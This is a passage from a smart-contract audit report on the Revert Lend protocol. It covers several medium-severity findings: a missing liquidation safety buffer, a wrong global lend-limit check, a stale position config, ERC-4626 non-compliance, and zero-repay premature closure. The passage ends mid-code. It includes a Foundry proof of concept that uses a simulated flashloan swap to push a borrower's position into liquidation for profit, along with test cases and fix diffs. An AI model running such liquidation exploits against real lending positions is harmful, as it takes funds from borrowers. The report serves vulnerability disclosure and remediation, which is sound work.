However, the issue in the code is that the the start of the liquidation threshold (I.E. 85%) is supposed to be greater than the loan to value ratio (I.E. 80%) to create some breathing room for the user and reduce the risk of the protocol incurring bad debt.

### Impact

Borrowers of the protocol may be unfairly liquidated due to minor movements in the market when taking out the max loan. In the worst case scenario, a user could be subject to a forced liquidation by the attacker (a malicious user or a bot) for profit.

### Proof of Concept

The proof of concept below simulates a scenario where a user takes out a loan. The malicious user creates some small movements in the market in order to purposely sink a user’s position. The malicious user then liquidates the victim for profit forked from the Ethereum mainnet:

<details>

```solidity
contract ProofOfConcept__Vault_transform__Uv3Utils__Forced_Liquidation__Safety_Buffer is Test {
    uint256 constant Q32 = 2 ** 32;
    uint256 constant Q96 = 2 ** 96;

    uint256 constant YEAR_SECS = 31557600; // taking into account leap years

    address constant WHALE_ACCOUNT = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    INonfungiblePositionManager constant NPM = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address EX0x = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x exchange proxy
    address UNIVERSAL_ROUTER = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
    address PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address constant CHAINLINK_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant CHAINLINK_DAI_USD = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    address constant CHAINLINK_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

    address constant UNISWAP_DAI_USDC = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // 0.01% pool
    address constant UNISWAP_ETH_USDC = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // 0.05% pool
    address constant UNISWAP_DAI_USDC_005 = 0x6c6Bc977E13Df9b0de53b251522280BB72383700; // 0.05% pool

    address constant TEST_NFT_ACCOUNT = 0x3b8ccaa89FcD432f1334D35b10fF8547001Ce3e5;
    uint256 constant TEST_NFT = 126; // DAI/USDC 0.05% - in range (-276330/-276320)

    address constant TEST_NFT_ACCOUNT_2 = 0x454CE089a879F7A0d0416eddC770a47A1F47Be99;
    uint256 constant TEST_NFT_2 = 1047; // DAI/USDC 0.05% - in range (-276330/-276320)

    uint256 constant TEST_NFT_UNI = 1; // WETH/UNI 0.3%

    uint256 mainnetFork;

    V3Vault vault;

    InterestRateModel interestRateModel;
    V3Oracle oracle;

    address alice = vm.addr(9);
    address eve = vm.addr(8);
    address bob = vm.addr(7);

    bool shouldReenter = false;

    function setUp() external {
        mainnetFork = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/[YOUR-RPC-URL]", 18521658);
        vm.selectFork(mainnetFork);

        // 0% base rate - 5% multiplier - after 80% - 109% jump multiplier (like in compound v2 deployed)  (-> max rate 25.8% per year)
        interestRateModel = new InterestRateModel(0, Q96 * 5 / 100, Q96 * 109 / 100, Q96 * 80 / 100);

        // use tolerant oracles (so timewarp for until 30 days works in tests - also allow divergence from price for mocked price results)
        oracle = new V3Oracle(NPM, address(USDC), address(0));
        oracle.setTokenConfig(
            address(USDC),
            AggregatorV3Interface(CHAINLINK_USDC_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(address(0)),
            0,
            V3Oracle.Mode.TWAP,
            0
        );
        oracle.setTokenConfig(
            address(DAI),
            AggregatorV3Interface(CHAINLINK_DAI_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(UNISWAP_DAI_USDC),
            60,
            V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            50000
        );
        oracle.setTokenConfig(
            address(WETH),
            AggregatorV3Interface(CHAINLINK_ETH_USD),
            3600 * 24 * 30,
            IUniswapV3Pool(UNISWAP_ETH_USDC),
            60,
            V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            50000
        );

        vault =
            new V3Vault("Revert Lend USDC", "rlUSDC", address(USDC), NPM, interestRateModel, oracle, IPermit2(PERMIT2));
        vault.setTokenConfig(address(USDC), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
        vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
        vault.setTokenConfig(address(WETH), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value

        vault.setLimits(0, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6);

        // without reserve for now
        vault.setReserveFactor(0);

        vm.warp(block.timestamp + 2 days);

    }

    struct TempVariables {
        uint256 wethFlashloan;
        uint256 debt;
        uint256 fullValue;
        uint256 collateralValue;

    }

    function testForcedLiquidation() public { 
		    // Setup scenario
        ERC20 usdc = ERC20(address(USDC));
        ERC20 weth = ERC20(address(WETH));
        IUniswapV3Factory factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
        IUniswapV3Pool usdcweth = IUniswapV3Pool(address(factory.getPool(address(usdc), address(weth), 500)));

        deal(address(usdc), address(bob), 100_000 * 1e6);
        deal(address(usdc), address(alice), 100_000 * 1e6);
        deal(address(weth), address(alice), 10 ether);

				// Bob supplies liquidity to the pool
        vm.startPrank(address(bob));
        uint256 amount = 100_000 * 1e6;
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(amount, address(bob));
        vm.stopPrank();

				// Alice opens a usdc - weth LP position 
        vm.startPrank(address(alice));

        usdc.approve(address(NPM), type(uint256).max);
        weth.approve(address(NPM), type(uint256).max);
        // Current Tick: 200981
        // In range Position
        INonfungiblePositionManager.MintParams memory mp = INonfungiblePositionManager.MintParams({
            token0: usdcweth.token0(),
            token1: usdcweth.token1(),
            fee: usdcweth.fee(),
            tickLower: 	199460,
            tickUpper:  204520,
            amount0Desired: 50_000 * 1e6,
            amount1Desired: 10 ether,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(alice),
            deadline: block.timestamp + 1 days
        });

        (uint256 tokenId,,,) = NPM.mint(mp);

        NPM.setApprovalForAll(address(vault), true);
        vault.create(tokenId, address(alice));

        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
        vault.borrow(tokenId, collateralValue); // Borrows max collateralValue
        vm.stopPrank();

        assertEq(weth.balanceOf(eve), 0); // Assert Eve starts with no tokens

        vm.startPrank(address(eve));

        TempVariables memory tv = TempVariables({
            wethFlashloan: 0,
            debt: 0,
            fullValue: 0,
            collateralValue: 0
        });

        tv.wethFlashloan = 30 ether; // Flashloan value
        deal(address(weth), address(eve), tv.wethFlashloan); // Simulate flashloan

        // Sink the victim's position on purpose through a swap
        weth.approve(address(0xE592427A0AEce92De3Edee1F18E0157C05861564), type(uint256).max);
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(weth),
            tokenOut: address(usdc),
            fee: 500,
            recipient: address(eve),
            deadline: block.timestamp,
            amountIn: tv.wethFlashloan,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        swapRouter.exactInputSingle(
            swapParams
        );
        
        // Perform a liquidation to kick the user off the protocol
        (tv.debt,tv.fullValue,tv.collateralValue,,) = vault.loanInfo(tokenId);
        usdc.approve(address(vault), type(uint256).max);
        IVault.LiquidateParams memory lp = IVault.LiquidateParams({
            tokenId: tokenId,
            debtShares: tv.debt,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(eve),
            permitData: ""
        });
        vault.liquidate(lp);
				
        usdc.approve(address(swapRouter), type(uint256).max);
        // Swap back all usdc and profit
        swapParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(usdc),
            tokenOut: address(weth),
            fee: 500,
            recipient: address(eve),
            deadline: block.timestamp,
            amountIn: usdc.balanceOf(address(eve)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        swapRouter.exactInputSingle(swapParams);

        // Return flashloan
        weth.transfer(address(0), tv.wethFlashloan); // Simulate flashloan repayment by transferring to the burn address
        vm.stopPrank();
				
				// Assert that Eve profited
        assertEq(weth.balanceOf(eve), 568684386651804250);

    }

    function _getTick(IUniswapV3Pool pool) internal returns(int24) {

        (,int24 tick,,,,,) = pool.slot0();
        return tick;
    }

    function _isInRange(IUniswapV3Pool pool, uint256 tokenId) internal returns(bool) {
        int24 tick = _getTick(pool);
        (,,,,,int24 lowerTick, int24 upperTick,,,,,) = NPM.positions(tokenId);
        if(tick >= lowerTick && tick <= upperTick) {
            return true;
        }
        return false;
    }

}
```

</details>

### Recommended Mitigation Steps

Consider implementing a safety buffer for the users position, which is considered when attempting to take out a loan so that they are not subject to liquidations due to minor changes in the market. For instance, if the liquidation threshold is at 80%, the borrower’s max loan is at 75% of that ratio. After some small changes in market conditions the position is now at a `75.00002%` and is still safe from liquidations as it is still over collateralised. This can be done by implementing this as another state variable and checking that the requested debt is initially below this threshold. When attempting to liquidate, the health of the position is then checked against the liquidation threshold.

**[kalinbas (Revert) disputed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363#issuecomment-2021002318):**
 > It's a design choice and we probably will add a safety buffer on the frontend. But in contract it is not needed.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363#issuecomment-2028606075):**
 > I think this is a valid Medium, as typically the safety measures added at the frontend are considered unreliable. I don't quite understand the significant benefits of the current design; it only slightly increases capital efficiency but exposes users to liquidation risks.

**[kalinbas (Revert) confirmed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363#issuecomment-2030606953):**
 > Agreed. Will add this safety buffer

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/17) - added safety buffer for `borrow` and `decreaseLiquidity` (not for transformers).

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/88) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/40).

***

## [[M-12] Wrong global lending limit check in `_deposit` function](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/324)
*Submitted by [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/324), also found by [linmiaomiao](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/494), [KupiaSec](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/263), [befree3x](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/252), [pynschon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/239), [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/217), and [Topmark](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/87)*

The `_deposit` function is invoked in both the `deposit` and `mint` functions when a user wants to lend assets. This function is intended to ensure that the total amount of assets lent does not exceed the protocol limit `globalLendLimit`.

```solidity
function _deposit(
    address receiver,
    uint256 amount,
    bool isShare,
    bytes memory permitData
) internal returns (uint256 assets, uint256 shares) {
    ...

    _mint(receiver, shares);

    //@audit must convert totalSupply() to assets before comparing with globalLendLimit
    if (totalSupply() > globalLendLimit) {
        revert GlobalLendLimit();
    }

    if (assets > dailyLendIncreaseLimitLeft) {
        revert DailyLendIncreaseLimit();
    } else {
        dailyLendIncreaseLimitLeft -= assets;
    }
    ...
}
```

In the provided code snippet, the `_deposit` function checks the `totalSupply()` against the `globalLendLimit` limit. However, `totalSupply()` represents the lenders' share amount and does not represent the actual asset amount lent. It must first be converted to assets using the `_convertToAssets` function.

This mistake is evident because in the `maxDeposit` function, the correct check is implemented:

```solidity
function maxDeposit(address) external view override returns (uint256) {
    (, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;
    uint256 value = _convertToAssets(
        totalSupply(),
        lendExchangeRateX96,
        Math.Rounding.Up
    );
    if (value >= globalLendLimit) {
        return 0;
    } else {
        return globalLendLimit - value;
    }
}
```

Because the `_deposit` function performs the wrong check, it will allow more assets to be lent in the protocol. This is due to the fact that the lending exchange rate `lastLendExchangeRateX96` will be greater than 1 (due to interest accrual), and so we will always have `totalSupply() < _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up)`. The only case this might not hold is when there is a significant bad debt after liquidation, which would not occur under normal circumstances.

### Impact

Incorrect global lending checking in the `_deposit` function will result in more assets being lent than allowed by the protocol.

### Tools Used

VS Code

### Recommended Mitigation

To address this issue, the `totalSupply()` must be converted to an asset amount before checking it against `globalLendLimit`, as is done in the `maxDeposit` function:

```diff
function _deposit(
    address receiver,
    uint256 amount,
    bool isShare,
    bytes memory permitData
) internal returns (uint256 assets, uint256 shares) {
    ...

    _mint(receiver, shares);

++  //@audit must convert totalSupply() to assets before comparing with globalLendLimit
++  uint256 value = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up);
++  if (value > globalLendLimit) {
--  if (totalSupply() > globalLendLimit) {
        revert GlobalLendLimit();
    }

    if (assets > dailyLendIncreaseLimitLeft) {
        revert DailyLendIncreaseLimit();
    } else {
        dailyLendIncreaseLimitLeft -= assets;
    }
    ...
}
```

### Assessed type

Error

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/324#issuecomment-2020922037)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/16).

**Status:** Unmitigated. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/89), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/64) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/17), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-13] User might execute `PositionToken` of token set by previous token owner](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/256)
*Submitted by [cryptphi](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/256)*

The `AutoRange.configToken()` function updates the state variable `positionConfigs` for a `tokenId` and callable by the owner of the `tokenId`. However, in the call to `AutoRange.execute()`, the state variable `positionConfigs` for the `tokenId` is used in setting the local variable `PositionConfig memory config` without any further check to ensure the config has been set by the current owner of the `tokenId`.

This in some way could affect the swapcall on the token position such that the protocol does not receive any incentive.

### Proof of Concept

1. Alice is an operator and owns token 1 and sets the `configToken()` to configure token to be used before calling `executeWithVault()`.

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L276-L297>

`positionConfigs` state variable for `tokenId` is set in `configToken()` by token owner:

    function configToken(uint256 tokenId, address vault, PositionConfig calldata config) external {
            _validateOwner(tokenId, vault);

            // lower tick must be always below or equal to upper tick - if they are equal - range adjustment is deactivated
            if (config.lowerTickDelta > config.upperTickDelta) {
                revert InvalidConfig();
            }

            positionConfigs[tokenId] = config;

2. After a while and eventually Alice no longer has any position on token and transfers the token to Bob.

3. Bob is another operator and calls `executeWithVault()`; the calls happen using the old token config set by Alice.

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L111-L116>

`positionConfigs`\[`tokenId`] set by a previous `tokenId` owner being used:

    function execute(ExecuteParams calldata params) external {
            if (!operators[msg.sender] && !vaults[msg.sender]) {
                revert Unauthorized();
            }
            ExecuteState memory state;
            PositionConfig memory config = positionConfigs[params.tokenId];

### Recommended Mitigation Steps

Using an enumerable set or additional mapping parameter to set the current owner in the `positionConfigs` state variable and an additional check in `execute()` to ensure the config was set by token owner.

**[kalinbas (Revert) acknowledged and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/256#issuecomment-2020889898):**
 > Position config is not reset when transferring a position to someone else, but the operator `approval`/`approvalforall` is reset. So the position can't be automated anymore, and if it is given approval, the revert UI will also let the user set the new config. So this is valid but not a problem.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/256#issuecomment-2028615749):**
 > Makes sense. I also believe that frontend security checks are unreliable, so I'm still maintaining it as an Medium.

***

## [[M-14] `V3Vault` is not ERC-4626 compliant](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/249)
*Submitted by [Limbooo](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/249), also found by [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/457), [btk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/385), [14si2o\_Flint](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/349), [wangxx2026](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/347), [Silvermist](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/341), [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/334), [shaka](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/332), [jnforja](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/259), [crypticdefense](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/246), [erosjohn](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/226), [0xspryon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/201), y0ng0p3 ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/151), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/145)), [0xDemon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/111), and [alix40](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/49)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L301-L309>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L312-L320>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L323-L326>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L329-L331>

### Impact

Protocols that try to integrate with Revert Lend, expecting `V3Vault` to be ERC-4626 compliant, will multiple issues that may damage Revert Lend's brand and limit Revert Lend's growth in the market.

### Proof of Concept

All official ERC-4626 requirements are on their [official page](https://eips.ethereum.org/EIPS/eip-4626). Non-compliant methods are listed below along with why they are not compliant and coded POCs demonstrating the issues.

### `V3Vault::maxDeposit` and `V3Vault::maxMint`

As specified in ERC-4626, both `maxDeposit` and `maxMint` must return the maximum amount that would allow to be used and not cause a revert. Also, if the deposits or mints are disabled at current moment, it MUST return `0`.

### `ERC4626::maxDeposit` Non-compliant requirements

> MUST return the maximum amount of assets `deposit` would allow to be deposited for `receiver` and **not cause a revert**, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

> MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it **MUST return 0**.

### `ERC4626::maxMint` Non-compliant requirements

> MUST return the maximum amount of shares `mint` would allow to be deposited to `receiver` and **not cause a revert**, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

> MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it **MUST return 0**.

However, in both `V3Vault::maxDeposit` or `V3Vault::maxMint` returns the amount that causes a revert in `deposit` or `mint`. This is because they do not check if the amount exceeded the daily lend limit and if this is a case, it will cause a revert inside `_deposit` function (where it used in both `deposit` and `mint`):

```solidity
src/V3Vault.sol:
915:         if (assets > dailyLendIncreaseLimitLeft) {
916:             revert DailyLendIncreaseLimit();
917:         } else {
```

Furthermore, when `dailyLendIncreaseLimitLeft == 0` that means the deposits and mints are temporarily disabled, while both `V3Vault::maxDeposit` and `V3Vault::maxMint` could return amounts that is more than `0`. Based on ERC4626 requirements, it MUST return `0` in this case.

### Test Case (Foundry)

To run the POC, copy-paste it into `V3Vault.t.sol`:

```solidity
    function testPOC_MaxDepositDoesNotReturnZeroWhenExceedsDailyLimit() public {
        uint256 dailyLendIncreaseLimitMin = vault.dailyLendIncreaseLimitMin();
        uint256 depositAmount = dailyLendIncreaseLimitMin;

        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, WHALE_ACCOUNT);

        //Should return 0 to comply to ERC-4626.
        assertNotEq(vault.maxDeposit(address(WHALE_ACCOUNT)), 0);

        USDC.approve(address(vault), 1);
        vm.expectRevert(IErrors.DailyLendIncreaseLimit.selector);
        vault.deposit(1, WHALE_ACCOUNT);

        vm.stopPrank();
    }
```

### `V3Vault::maxWithdraw` and `V3Vault::maxRedeem`

As specified in ERC-4626, both `maxWithdraw` and `maxRedeem` must return the maximum amount that would allow to be  transferred from owner and not cause a revert. Also, if the withdrawals or redemption are disabled at current moment, it MUST return `0`.

### `ERC4626::maxWithdraw` Non-compliant requirements

> MUST return the maximum amount of assets that could be transferred from `owner` through `withdraw` and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

### `ERC4626::maxRedeem` Non-compliant requirements

> MUST return the maximum amount of shares that could be transferred from `owner` through `redeem` and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

> MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return `0`.

However, in both `V3Vault::maxWithdraw` or `V3Vault::maxRedeem` returns the amount that causes a revert in `withdraw` or `redeem`. This is because they do not check if the amount exceeded the current available balance in the vault and if this is a case, it will cause a revert inside `_withdraw` function (where it used in both `withdraw` and `redeem`):

```solidity
src/V3Vault.sol:
962:         (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);
963:         if (available < assets) {
964:             revert InsufficientLiquidity();
965:         }
```

### Test Case (Foundry)

To run the POC, copy-paste it into `V3Vault.t.sol`:

```solidity
    function testPOC_MaxWithdrawDoesNotReturnZeroWhenExceedsAvailableBalance() external {
        // maximized collateral loan
        _setupBasicLoan(true);

        uint256 amount = vault.maxRedeem(address(WHALE_ACCOUNT));

        (,,, uint256 available,,,) = vault.vaultInfo();

        //Should return available balance if it is less than owner balance to comply to ERC-4626.
        assertNotEq(vault.maxRedeem(address(WHALE_ACCOUNT)), available);

        vm.expectRevert(IErrors.InsufficientLiquidity.selector);
        vm.prank(WHALE_ACCOUNT);
        vault.redeem(amount, WHALE_ACCOUNT, WHALE_ACCOUNT);
    }
```

### Recommended Mitigation Steps

To address the non-compliance issues, the following changes are recommended:

```diff
diff --git a/src/V3Vault.sol b/src/V3Vault.sol
index 64141ec..a25cebd 100644
--- a/src/V3Vault.sol
+++ b/src/V3Vault.sol
@@ -304,7 +304,12 @@ contract V3Vault is ERC20, Multicall, Ownable, IVault, IERC721Receiver, IErrors
         if (value >= globalLendLimit) {
             return 0;
         } else {
-            return globalLendLimit - value;
+            uint256 maxGlobalDeposit = globalLendLimit - value;
+            if (maxGlobalDeposit > dailyLendIncreaseLimitLeft) {
+                return dailyLendIncreaseLimitLeft;
+            } else {
+                return maxGlobalDeposit;
+            }
         }
     }

@@ -315,19 +320,37 @@ contract V3Vault is ERC20, Multicall, Ownable, IVault, IERC721Receiver, IErrors
         if (value >= globalLendLimit) {
             return 0;
         } else {
-            return _convertToShares(globalLendLimit - value, lendExchangeRateX96, Math.Rounding.Down);
+            uint256 maxGlobalDeposit = globalLendLimit - value;
+            if (maxGlobalDeposit > dailyLendIncreaseLimitLeft) {
+                return _convertToShares(dailyLendIncreaseLimitLeft, lendExchangeRateX96, Math.Rounding.Down);
+            } else {
+                return _convertToShares(maxGlobalDeposit, lendExchangeRateX96, Math.Rounding.Down);
+            }
         }
     }

     /// @inheritdoc IERC4626
     function maxWithdraw(address owner) external view override returns (uint256) {
-        (, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;
-        return _convertToAssets(balanceOf(owner), lendExchangeRateX96, Math.Rounding.Down);
+        uint256 ownerBalance = balanceOf(owner);
+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;
+        (, uint256 available, ) = _getAvailableBalance(debtExchangeRateX96, lendExchangeRateX96);
+        if (available > ownerBalance) {
+            return _convertToAssets(ownerBalance, lendExchangeRateX96, Math.Rounding.Down);
+        } else {
+            return _convertToAssets(available, lendExchangeRateX96, Math.Rounding.Down);
+        }
     }

     /// @inheritdoc IERC4626
     function maxRedeem(address owner) external view override returns (uint256) {
-        return balanceOf(owner);
+        uint256 ownerBalance = balanceOf(owner);
+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;
+        (, uint256 available, ) = _getAvailableBalance(debtExchangeRateX96, lendExchangeRateX96);
+        if (available > ownerBalance) {
+            return ownerBalance;
+        } else {
+            return available;
+        }
     }
```

The modified `maxDeposit` function now correctly calculates the maximum deposit amount by considering both the global lend limit and the daily lend increase limit. If the calculated maximum global deposit exceeds the daily lend increase limit, the function returns the daily lend increase limit to comply with ERC-4626 requirements.

Similarly, the modified `maxMint` ensures compliance with ERC-4626 by calculating the maximum mints amount for a given owner. It considers both the global lend limit and the daily lend increase limit as mentioned in `maxDeposit`.

The modified `maxWithdraw` function now correctly calculates the maximum withdrawal amount for a given owner. It ensures that the returned value does not exceed the available balance in the vault. If the available balance is greater than the owner's balance, it returns the owner's balance, otherwise it return the available balance to prevent potential reverts during withdrawal transactions. This adjustment aligns with ERC-4626 requirements by ensuring that withdrawals do not cause unexpected reverts and accurately reflect the available funds for withdrawal.

Similarly, the modified `maxRedeem` function ensures compliance with ERC-4626 by calculating the maximum redemption amount for a given owner. It considers both the owner's balance and the available liquidity in the vault as mentioned in `maxWithdraw`.

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/249#issuecomment-2020835242)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/15).

**Status:** Mitigation Confirmed. Full details in the report from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/100).

***

## [[M-15] Users' newly created positions can be prematurely closed and removed from the vault directly after they are created](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/232)
*Submitted by [JCN](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/232), also found by [0xPhantom](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/373)*

A user can create a position by calling the `create` function or by simply sending the NFT to the vault via `safeTransferFrom`. Both of those methods will trigger the `V3Vault::onERC721Received` function:

[V3Vault::onERC721Received](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L446-L448)

```solidity
446:            loans[tokenId] = Loan(0);
447:
448:            _addTokenToOwner(owner, tokenId); // @audit: NFT added to storage
```

The loan for this position (`loans[tokenId]`) is instantiated with `0` debt and the NFT is added to storage:

[V3Vault::\_addTokenToOwner](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1297-L1301)

```solidity
1297:    function _addTokenToOwner(address to, uint256 tokenId) internal {
1298:        ownedTokensIndex[tokenId] = ownedTokens[to].length;
1299:        ownedTokens[to].push(tokenId);
1300:        tokenOwner[tokenId] = to; // @audit: to == user address
1301:    }
```

At this point, the user has only instantiated their position and has not borrowed against it, meaning the position's debt is `0`. Additionally, the `V3Vault::_repay` function does not require the `amount` to repay a position's debt to be non-zero. Thus, the following will occur when a malicious actor repays the non-existent debt of the newly created position with `0` value:

[V3Vault::\_repay](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L954)

```solidity
954:    function _repay(uint256 tokenId, uint256 amount, bool isShare, bytes memory permitData) internal {
955:        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();
956:
957:        Loan storage loan = loans[tokenId];
958:
959:        uint256 currentShares = loan.debtShares; // @audit: 0, newly instantiated
960:
961:        uint256 shares;
962:        uint256 assets;
963:
964:        if (isShare) {
965:            shares = amount; // @audit: amount == 0
966:            assets = _convertToAssets(amount, newDebtExchangeRateX96, Math.Rounding.Up);
967:        } else {
968:            assets = amount; // @audit: amount == 0
969:            shares = _convertToShares(amount, newDebtExchangeRateX96, Math.Rounding.Down);
970:        }
971:
972:        // fails if too much repayed
973:        if (shares > currentShares) { // @audit: 0 == 0
974:            revert RepayExceedsDebt();
975:        }
...
990:        uint256 loanDebtShares = loan.debtShares - shares; // @audit: null storage operations
991:        loan.debtShares = loanDebtShares;
992:        debtSharesTotal -= shares;
...
1001:        address owner = tokenOwner[tokenId]; // @audit: user's address
1002:
1003:        // if fully repayed
1004:        if (currentShares == shares) { // @audit: 0 == 0
1005:            _cleanupLoan(tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, owner); // @audit: remove NFT from storage and send NFT back to user
```

As we can see above, repaying an empty position with `0` amount will result in the protocol believing that the loan is being fully repaid (see line 1004). Therefore, the `_cleanupLoan` internal function will be invoked, which will remove the position from storage and send the NFT back to the user:

[V3Vault::\_cleanupLoan](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1077-L1083)

```solidity
1077:    function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)
1078:        internal
1080:    {
1081:        _removeTokenFromOwner(owner, tokenId); // @audit: remove NFT from storage
